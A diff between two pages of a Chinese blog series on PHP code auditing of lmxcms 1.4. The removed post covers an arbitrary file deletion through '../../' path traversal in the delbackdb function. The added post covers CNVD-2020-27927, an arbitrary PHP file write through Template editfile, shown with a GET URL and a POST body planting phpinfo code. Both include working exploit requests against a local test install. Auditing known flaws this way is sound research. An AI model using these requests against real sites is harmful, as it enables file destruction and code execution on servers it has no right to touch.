@@ -16,32 +16,31 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="php代码审计cnvd梦想cms文件删除漏洞 漏洞描述中说的是Ba*** 存在任意文件删除漏洞  在源码中可以看到在后台中只存在两个ba开头的文件，那漏洞就一定存在于其中之一了  我的思路是直接搜一波删除，在备注中发现back****文件中删除的功能较多，优先审计这边 这边先给出php中删除的函数 在 PHP 中，删除文件的函数主要有以下几种： 1.unlink() 函数：使用 unlink()">
+    <meta name="description" content="CNVD-2020-27927 本篇文章是接着上一篇文章衍生出来的漏洞，并且是一个高危  上篇说到，在lmxcms的c&#x2F;admin&#x2F;TemplateAction.class.php文件中存在文件读取漏洞，并且可以将读取的文件修改并提交   123456789101112131415161718192021public function editfile()&amp;#123;    $">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php代码审计-文件安全(1)">
-<meta property="og:url" content="https://zzhnohikari.github.io/2023/07/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:title" content="php代码审计-文件安全(3)">
+<meta property="og:url" content="https://zzhnohikari.github.io/2023/07/23/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="php代码审计cnvd梦想cms文件删除漏洞 漏洞描述中说的是Ba*** 存在任意文件删除漏洞  在源码中可以看到在后台中只存在两个ba开头的文件，那漏洞就一定存在于其中之一了  我的思路是直接搜一波删除，在备注中发现back****文件中删除的功能较多，优先审计这边 这边先给出php中删除的函数 在 PHP 中，删除文件的函数主要有以下几种： 1.unlink() 函数：使用 unlink()">
+<meta property="og:description" content="CNVD-2020-27927 本篇文章是接着上一篇文章衍生出来的漏洞，并且是一个高危  上篇说到，在lmxcms的c&#x2F;admin&#x2F;TemplateAction.class.php文件中存在文件读取漏洞，并且可以将读取的文件修改并提交   123456789101112131415161718192021public function editfile()&amp;#123;    $">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038220720-667d7bc8-c853-4d0b-8cb8-f223b5595188.png">
-<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038467679-bf62f9dc-a2e8-4a66-9c5a-ea0ce9c59050.png">
-<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038593756-c4cea59d-25fc-4be2-9470-7dc48d1d3e09.png">
-<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690039100096-f68014cf-1b90-4e1f-a2ef-0ea45cb15417.png">
-<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690039928024-78b40566-58e0-4cfb-837d-eac8dcb323c3.png">
-<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230723094946209.png">
-<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690076732089-1401b077-148b-4b48-a868-fffdfdde628e.png">
-<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690076767740-f8a12e4b-9727-49ab-8f0a-02c0a527ad8f.png">
-<meta property="article:published_time" content="2023-07-22T15:12:51.000Z">
-<meta property="article:modified_time" content="2023-07-23T05:37:27.961Z">
+<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/image-20230723135337391.png">
+<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/image-20230723140007493.png">
+<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/image-20230723140042375.png">
+<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/1690092684830-321f240d-cd4e-4856-9ab8-4f88e33e6e1e.png">
+<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/1690094929724-f1d8476e-e7df-4cff-be83-f295bb0e4e73.png">
+<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/1690094891842-20ab5cd2-d825-4470-94d3-4031215b965a.png">
+<meta property="og:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/1690094949597-6b719771-2741-4eb1-b0a8-3005ad6ac75c.png">
+<meta property="article:published_time" content="2023-07-23T05:52:43.000Z">
+<meta property="article:modified_time" content="2023-07-23T06:50:48.802Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="网络安全">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038220720-667d7bc8-c853-4d0b-8cb8-f223b5595188.png">
+<meta name="twitter:image" content="https://zzhnohikari.github.io/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/image-20230723135337391.png">
   
   
   
-  <title>php代码审计-文件安全(1) - Hexo</title>
+  <title>php代码审计-文件安全(3) - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -246,7 +245,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="php代码审计-文件安全(1)"></span>
+            <span id="subtitle" data-typed-text="php代码审计-文件安全(3)"></span>
           
         </div>
 
@@ -257,8 +256,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-22 23:12" pubdate>
-          2023年7月22日 晚上
+        <time datetime="2023-07-23 13:52" pubdate>
+          2023年7月23日 下午
         </time>
       </span>
     
@@ -269,7 +268,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.4k 字
+          2.6k 字
         
       </span>
     
@@ -280,7 +279,7 @@
         
         
         
-          21 分钟
+          22 分钟
         
       </span>
     
@@ -317,56 +316,51 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">php代码审计-文件安全(1)</h1>
+            <h1 id="seo-header">php代码审计-文件安全(3)</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h2><h3 id="cnvd梦想cms文件删除漏洞"><a href="#cnvd梦想cms文件删除漏洞" class="headerlink" title="cnvd梦想cms文件删除漏洞"></a>cnvd梦想cms文件删除漏洞</h3><p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038220720-667d7bc8-c853-4d0b-8cb8-f223b5595188.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>漏洞描述中说的是Ba*** 存在任意文件删除漏洞</p>
-<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038467679-bf62f9dc-a2e8-4a66-9c5a-ea0ce9c59050.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>在源码中可以看到在后台中只存在两个ba开头的文件，那漏洞就一定存在于其中之一了</p>
-<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690038593756-c4cea59d-25fc-4be2-9470-7dc48d1d3e09.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>我的思路是直接搜一波删除，在备注中发现back****文件中删除的功能较多，优先审计这边</p>
-<p>这边先给出php中删除的函数</p>
-<p>在 PHP 中，删除文件的函数主要有以下几种：</p>
-<p>1.unlink() 函数：使用 unlink() 函数可以删除指定路径下的文件。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">$file = &#x27;/path/to/file.txt&#x27;;<br>if (!unlink($file)) &#123;<br>    echo &quot;Error deleting $file&quot;;<br>&#125; else &#123;<br>    echo &quot;$file deleted&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
+                <p><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-27927">CNVD-2020-27927</a></p>
+<p>本篇文章是接着上一篇文章衍生出来的漏洞，并且是一个高危</p>
+<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/image-20230723135337391.png" srcset="/img/loading.gif" lazyload alt="image-20230723135337391"></p>
+<p>上篇说到，在lmxcms的c&#x2F;admin&#x2F;TemplateAction.class.php文件中存在文件读取漏洞，并且可以将读取的文件修改并提交</p>
+<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/image-20230723140007493.png" srcset="/img/loading.gif" lazyload alt="image-20230723140007493"></p>
+<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/image-20230723140042375.png" srcset="/img/loading.gif" lazyload alt="image-20230723140042375"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editfile</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-comment">//保存修改</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;settemcontent&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-string">&#x27;template_edit&#x27;</span>])&#123;<br>            rewrite::<span class="hljs-title function_ invoke__">js_back</span>(<span class="hljs-string">&#x27;系统设置禁止修改模板文件&#x27;</span>);<br>        &#125;<br>        file::<span class="hljs-title function_ invoke__">put</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-keyword">string</span>::<span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;temcontent&#x27;</span>]));<br>        <span class="hljs-title function_ invoke__">addlog</span>(<span class="hljs-string">&#x27;修改模板文件&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>);<br>        rewrite::<span class="hljs-title function_ invoke__">succ</span>(<span class="hljs-string">&#x27;修改成功&#x27;</span>,<span class="hljs-string">&#x27;?m=Template&amp;a=opendir&amp;dir=&#x27;</span>.<span class="hljs-variable">$dir</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$pathinfo</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$dir</span>);<br>    <span class="hljs-comment">//获取文件内容</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-keyword">string</span>::<span class="hljs-title function_ invoke__">html_char</span>(file::<span class="hljs-title function_ invoke__">getcon</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>));<br>    <span class="hljs-comment">// echo $this-&gt;config[&#x27;template&#x27;].$dir;</span><br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-variable">$pathinfo</span>[<span class="hljs-string">&#x27;basename&#x27;</span>]);<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;temcontent&#x27;</span>,<span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;dir&#x27;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>]));<br>    <span class="hljs-variable language_">$this</span>-&gt;smarty-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;Template/temedit.html&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>2.rmdir() 函数：使用 rmdir() 函数可以删除指定路径下的空目录。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">$dir = &#x27;/path/to/empty/dir&#x27;;<br>if (!rmdir($dir)) &#123;<br>    echo &quot;Error deleting $dir&quot;;<br>&#125; else &#123;<br>    echo &quot;$dir deleted&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file::<span class="hljs-title function_ invoke__">put</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;template&#x27;</span>].<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-keyword">string</span>::<span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;temcontent&#x27;</span>]));<br></code></pre></td></tr></table></figure>
 
-<p>3.unlink() 和 rmdir() 的结合使用：如果要删除非空目录，则需要先递归地删除目录中的所有文件和子目录，然后再删除该目录本身。可以使用 unlink() 和 rmdir() 的结合使用来实现这个功能。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">function deleteDirectory($dir) &#123;<br>    if (!file_exists($dir)) &#123;<br>        return true;<br>    &#125;<br><br>    if (!is_dir($dir)) &#123;<br>        return unlink($dir);<br>    &#125;<br><br>    foreach (scandir($dir) as $item) &#123;<br>        if ($item == &#x27;.&#x27; || $item == &#x27;..&#x27;) &#123;<br>            continue;<br>        &#125;<br>        <br>        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) &#123;<br>            return false;<br>        &#125;<br>    &#125;<br><br>    return rmdir($dir);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>我们可以看到在这里有一个file::put</p>
+<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/1690092684830-321f240d-cd4e-4856-9ab8-4f88e33e6e1e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>搜索一下put或者其他编辑器直接看一下声明，就能转到put函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">put</span>(<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$path</span>,<span class="hljs-variable">$data</span>) === <span class="hljs-literal">false</span>)<br>        rewrite::<span class="hljs-title function_ invoke__">js_back</span>(<span class="hljs-string">&#x27;请检查【&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;】是否有读写权限&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690039100096-f68014cf-1b90-4e1f-a2ef-0ea45cb15417.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>搜索了一下，发现有四处存在unlink函数，上面三个函数都太大了，先从小的开始分析一波</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delOne</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>  <span class="hljs-variable">$dir</span> = ROOT_PATH.<span class="hljs-string">&#x27;file/back/&#x27;</span>.<span class="hljs-variable">$filename</span>;<br>  file::<span class="hljs-title function_ invoke__">unLink</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这段代码是一个 PHP 类中的公有静态方法，用于将字符串 $data 写入指定文件 $path 中。</p>
+<p>具体来说，这个方法使用 file_put_contents() 函数将 $data 内容写入到 $path 指定的文件中，并返回写入的字节数。如果写入失败，则使用 rewrite::js_back() 方法返回一个 JavaScript 弹窗提示信息，内容为 ‘请检查【’.$path.’】是否有读写权限’。</p>
+<p>file_put_contents</p>
+<p>file_put_contents() 函数是 PHP 内置的一个文件操作函数，用于将字符串写入指定文件中。它的语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">file_put_contents($filename, $data, $flags, $context);<br></code></pre></td></tr></table></figure>
 
-<p>这段代码看起来是一个 PHP 类中的私有方法，用于删除指定文件名 $filename 所代表的文件。</p>
-<p>具体来说，这个方法首先使用 ROOT_PATH 常量拼接出要删除的文件的完整路径，即 ROOT_PATH.’file&#x2F;back&#x2F;‘.$filename。然后，使用 file::unLink() 静态方法，调用 PHP 内置的 unlink() 函数来删除该文件。</p>
-<p>该函数名为delOne，在本文件中查找那些地方调用了该函数</p>
-<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690039928024-78b40566-58e0-4cfb-837d-eac8dcb323c3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>我们先来看第一个delbackdb函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delbackdb</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$filename</span>)&#123;<br>        rewrite::<span class="hljs-title function_ invoke__">js_back</span>(<span class="hljs-string">&#x27;备份文件不存在&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">delOne</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-title function_ invoke__">addlog</span>(<span class="hljs-string">&#x27;删除数据库备份文件&#x27;</span>);<br>    rewrite::<span class="hljs-title function_ invoke__">succ</span>(<span class="hljs-string">&#x27;删除成功&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>这段代码看起来是一个 PHP 类中的公有方法，用于删除指定的数据库备份文件。</p>
-<p>具体来说，这个方法首先通过 trim() 函数去掉 $_GET[‘filename’] 变量中的空格和换行符等不必要的字符，并将处理结果存储到 $filename 变量中。然后，判断 $filename 变量是否为空，如果为空，则使用 rewrite::js_back() 方法返回一个错误提示信息。</p>
-<p>如果 $filename 变量不为空，则调用 $this-&gt;delOne($filename) 方法来删除该文件。删除完成后，使用 addlog() 方法记录一条日志，表示成功删除了数据库备份文件；然后使用 rewrite::succ() 方法显示一个成功提示信息。</p>
-<p>那这里就很明确了，delbackdb函数中会调用delOne删除掉指定的文件，而delOne函数中</p>
-<p>$dir &#x3D; ROOT_PATH.’file&#x2F;back&#x2F;‘.$filename;</p>
-<p>受制于file&#x2F;back的限制，只能删除该文件夹下面的文件，那该如何绕过呢？当然是..&#x2F;..&#x2F;啦</p>
-<p>ok分析完毕，来尝试一波</p>
-<p>先找到删除备份文件的功能点正常删除一波找到删除的数据包</p>
-<p>是下面这种形式的，看这些传递的参数也非常熟悉</p>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Backdb&a=delbackdb&filename=xxxxx.txt">http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Backdb&amp;a=delbackdb&amp;filename=xxxxx.txt</a></p>
-<p>这里我在other下新建一个1.txt文件我们来看一下能不能删掉</p>
-<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230723094946209.png" srcset="/img/loading.gif" lazyload alt="image-20230723094946209"></p>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Backdb&a=delbackdb&filename=../../other/1.txt">http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Backdb&amp;a=delbackdb&amp;filename=../../other/1.txt</a></p>
-<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690076732089-1401b077-148b-4b48-a868-fffdfdde628e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>再回来看，1.txt已经被删除了</p>
-<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8/1690076767740-f8a12e4b-9727-49ab-8f0a-02c0a527ad8f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>到此这个1day就审计结束了</p>
+<p>其中，$filename 是要写入的文件名，可以是相对路径或绝对路径；</p>
+<p>$data 是要写入到文件中的数据，可以是一个字符串、一个数组或者一个可迭代对象（例如 Iterator 或 Traversable）；</p>
+<p>$flags 是可选参数，用于指定写入方式和处理方法，例如在原有内容后面追加、锁定文件等；$context 是可选参数，用于传递上下文信息。</p>
+<p>如果写入成功，则返回写入的字节数，否则返回 false。需要注意的是，在写入文件之前，必须确保该文件存在并且具有正确的写权限。如果文件不存在，则会尝试创建它。如果文件已经存在，并且没有设置覆盖标志，则会抛出一个 E_WARNING 错误。</p>
+<p>需要特别注意的是，file_put_contents() 函数会一次性将所有数据写入到文件中，并在写入过程中锁定文件。因此，如果要写入的数据量比较大，建议考虑使用流式写入或其他更高级别的文件操作方式，以减小系统负载和避免内存占用过多问题。</p>
+<p>editfile函数中</p>
+<p>settemcontent要设置为真，进入if语句中，并且传递filename参数来确定文件名，temcontent来确定传递的文件内容</p>
+<p>来组合一下</p>
+<p>get：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Template&a=editfile&dir=">http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Template&amp;a=editfile&amp;dir=</a></p>
+<p>post：</p>
+<p>settemcontent&#x3D;1&amp;filename&#x3D;test.php&amp;temcontent&#x3D;<?php phpinfo(); ?></p>
+<p>我们这里的dir为空，那么按理来说应该会存放在template文件夹下面（上一篇已经说了$this-&gt;config[‘template’]的值），那么提交数据</p>
+<p>现在这个文件夹下面没有文件，只有文件夹</p>
+<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/1690094929724-f1d8476e-e7df-4cff-be83-f295bb0e4e73.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/1690094891842-20ab5cd2-d825-4470-94d3-4031215b965a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/./../../images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-3/1690094949597-6b719771-2741-4eb1-b0a8-3005ad6ac75c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>发现这里出现了我们提交上去的文件</p>
+<p>ok这个1day就审计到这里</p>
 
                 
               </div>
@@ -428,8 +422,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>php代码审计-文件安全(1)</div>
-      <div>https://zzhnohikari.github.io/2023/07/22/php代码审计-文件安全/</div>
+      <div>php代码审计-文件安全(3)</div>
+      <div>https://zzhnohikari.github.io/2023/07/23/php代码审计-文件安全-3/</div>
     </div>
     <div class="license-meta">
       
@@ -441,7 +435,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年7月22日</div>
+          <div>2023年7月23日</div>
         </div>
       
       
@@ -473,18 +467,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/07/23/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A82/" title="php代码审计-文件安全(2)">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">php代码审计-文件安全(2)</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/07/22/Linux%E6%8F%90%E6%9D%83-1/" title="Linux提权(1)">
-                        <span class="hidden-mobile">Linux提权(1)</span>
+                      <a href="/2023/07/23/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A82/" title="php代码审计-文件安全(2)">
